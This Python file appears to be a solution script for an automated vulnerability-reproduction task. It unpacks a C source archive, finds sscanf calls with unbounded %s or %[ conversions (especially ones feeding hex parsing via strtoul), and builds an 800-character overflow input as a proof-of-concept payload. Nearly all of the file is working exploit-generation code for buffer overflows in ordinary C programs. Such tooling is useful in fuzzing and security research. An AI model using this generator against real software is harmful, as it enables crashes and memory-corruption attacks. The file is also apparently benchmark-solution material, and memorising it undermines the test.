import os
import re
import tarfile
import tempfile


LONG_HEX_LEN = 800


def unescape_c_string(s: str) -> str:
    try:
        return bytes(s, "utf-8").decode("unicode_escape")
    except Exception:
        return s


def parse_scanf_format(fmt: str):
    convs = []
    i = 0
    length = len(fmt)
    while i < length:
        if fmt[i] == '%':
            start = i
            i += 1
            if i < length and fmt[i] == '%':
                i += 1
                continue
            assign = True
            if i < length and fmt[i] == '*':
                assign = False
                i += 1
            width = None
            width_start = i
            while i < length and fmt[i].isdigit():
                i += 1
            if i > width_start:
                try:
                    width = int(fmt[width_start:i])
                except ValueError:
                    width = None
            while i < length and fmt[i] in "hlLzjt":
                i += 1
            if i >= length:
                break
            spec = fmt[i]
            i += 1
            set_text = None
            if spec == '[':
                set_start = i
                if i < length and fmt[i] == ']':
                    i += 1
                while i < length and fmt[i] != ']':
                    i += 1
                set_text = fmt[set_start:i]
                if i < length and fmt[i] == ']':
                    i += 1
            end = i
            convs.append(
                {
                    "start": start,
                    "end": end,
                    "spec": spec,
                    "width": width,
                    "assign": assign,
                    "set": set_text,
                }
            )
        else:
            i += 1
    return convs


def split_args(s: str):
    args = []
    cur = []
    depth = 0
    in_str = False
    esc = False
    for ch in s:
        if in_str:
            cur.append(ch)
            if esc:
                esc = False
            elif ch == '\\':
                esc = True
            elif ch == '"':
                in_str = False
        else:
            if ch == '"':
                in_str = True
                cur.append(ch)
            elif ch == '(':
                depth += 1
                cur.append(ch)
            elif ch == ')':
                depth = max(depth - 1, 0)
                cur.append(ch)
            elif ch == ',' and depth == 0:
                arg = ''.join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
            else:
                cur.append(ch)
    last = ''.join(cur).strip()
    if last:
        args.append(last)
    return args


def find_sscanf_calls(code: str):
    calls = []
    for m in re.finditer(r'\bsscanf\s*\(', code):
        start = m.end()  # position after '('
        i = start
        depth = 1
        in_str = False
        esc = False
        length = len(code)
        while i < length and depth > 0:
            c = code[i]
            if in_str:
                if esc:
                    esc = False
                elif c == '\\':
                    esc = True
                elif c == '"':
                    in_str = False
            else:
                if c == '"':
                    in_str = True
                elif c == '(':
                    depth += 1
                elif c == ')':
                    depth -= 1
                    if depth == 0:
                        break
            i += 1
        if depth == 0:
            argstr = code[start:i]
            calls.append(argstr)
    return calls


def choose_char_for_scanset(pattern: str) -> str:
    if not pattern:
        return 'A'
    negated = pattern[0] == '^'
    content = pattern[1:] if negated else pattern
    allowed = set()
    banned = set()

    i = 0
    plen = len(content)
    while i < plen:
        c = content[i]
        if c == '-' and i > 0 and i + 1 < plen:
            start = content[i - 1]
            end = content[i + 1]
            try:
                rng = range(ord(start), ord(end) + 1) if ord(start) <= ord(end) else range(ord(end), ord(start) + 1)
                if negated:
                    for chv in rng:
                        banned.add(chr(chv))
                else:
                    for chv in rng:
                        allowed.add(chr(chv))
            except Exception:
                pass
            i += 2
        else:
            if negated:
                banned.add(c)
            else:
                allowed.add(c)
            i += 1

    if not negated:
        if allowed:
            for ch in "0123456789ABCDEFabcdef":
                if ch in allowed:
                    return ch
            return sorted(allowed)[0]
        return 'A'
    else:
        for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
            if ch not in banned:
                return ch
        return 'Z'


def generate_long_string_for_conv(conv, long_len: int) -> str:
    if conv["spec"] == '[':
        ch = choose_char_for_scanset(conv.get("set") or "")
    else:
        ch = 'A'
    return ch * long_len


def generate_default_string_for_conv(conv) -> str:
    spec = conv["spec"]
    if spec == '[':
        ch = choose_char_for_scanset(conv.get("set") or "")
        return ch * 4
    if spec == 's':
        return "DEADBEEF"
    if spec in 'diuoxX':
        return "1"
    if spec in 'fFeEgGaA':
        return "1.0"
    if spec == 'c':
        return "A"
    if spec == 'p':
        return "0"
    if spec == 'n':
        return ""
    return "1"


def build_line_from_sscanf(fmt: str, convs, target_indices, long_len: int) -> str:
    parts = []
    last = 0
    for idx, conv in enumerate(convs):
        parts.append(fmt[last:conv["start"]])
        is_target = idx in target_indices
        if is_target and conv["spec"] in ('s', '[') and (conv["width"] is None or conv["width"] > 128):
            token = generate_long_string_for_conv(conv, long_len)
        else:
            token = generate_default_string_for_conv(conv)
        parts.append(token)
        last = conv["end"]
    parts.append(fmt[last:])
    line = ''.join(parts)
    if not line.endswith('\n'):
        line += '\n'
    return line


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="src_extract_")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                tar.extractall(tmpdir)
        except Exception:
            # Fallback simple PoC if extraction fails
            return (b"A" * LONG_HEX_LEN) + b"\n"

        c_files = []
        for root, dirs, files in os.walk(tmpdir):
            for name in files:
                if name.endswith(".c"):
                    c_files.append(os.path.join(root, name))

        targeted_line = None
        generic_lines = []

        strto_pattern = re.compile(
            r'\bstrto(?:ul|ull|l|ll)\s*\(\s*([^)]+?)\s*,\s*NULL\s*,\s*16\s*\)'
        )

        for path in c_files:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    code = f.read()
            except Exception:
                continue

            hex_vars = set()
            for m in strto_pattern.finditer(code):
                arg1 = m.group(1)
                vm = re.search(r'([A-Za-z_][A-Za-z0-9_]*)', arg1)
                if vm:
                    hex_vars.add(vm.group(1))

            sscanf_calls = find_sscanf_calls(code)
            for call in sscanf_calls:
                args = split_args(call)
                if len(args) < 2:
                    continue
                fmt_arg = args[1].strip()
                m = re.match(r'^"((?:[^"\\]|\\.)*)"', fmt_arg)
                if not m:
                    continue
                fmt_raw = m.group(1)
                fmt = unescape_c_string(fmt_raw)
                convs = parse_scanf_format(fmt)
                if not convs:
                    continue

                assignable_convs = [conv for conv in convs if conv["assign"]]
                varlist = []
                for a in args[2:]:
                    # extract last identifier as variable name
                    ids = re.findall(r'([A-Za-z_][A-Za-z0-9_]*)', a)
                    if ids:
                        varlist.append(ids[-1])
                # Map vars to convs
                ai = 0
                for conv in convs:
                    if conv["assign"]:
                        if ai < len(varlist):
                            conv["var"] = varlist[ai]
                        ai += 1

                # Targeted: look for conv linked to hex_vars
                target_indices = set()
                for idx, conv in enumerate(convs):
                    vname = conv.get("var")
                    if vname in hex_vars and conv["spec"] in ('s', '[') and conv["width"] is None:
                        target_indices.add(idx)
                        break

                if target_indices and targeted_line is None:
                    line = build_line_from_sscanf(fmt, convs, target_indices, LONG_HEX_LEN)
                    targeted_line = line

                # Generic: any unbounded string conversion
                if not target_indices:
                    gen_indices = [idx for idx, conv in enumerate(convs)
                                   if conv["spec"] in ('s', '[') and conv["width"] is None]
                    if gen_indices and len(generic_lines) < 5:
                        line = build_line_from_sscanf(fmt, convs, {gen_indices[0]}, LONG_HEX_LEN)
                        generic_lines.append(line)

        if targeted_line is not None:
            payload = targeted_line.encode("ascii", errors="replace")
            return payload

        if generic_lines:
            data = ''.join(generic_lines)
            return data.encode("ascii", errors="replace")

        return (b"A" * LONG_HEX_LEN) + b"\n"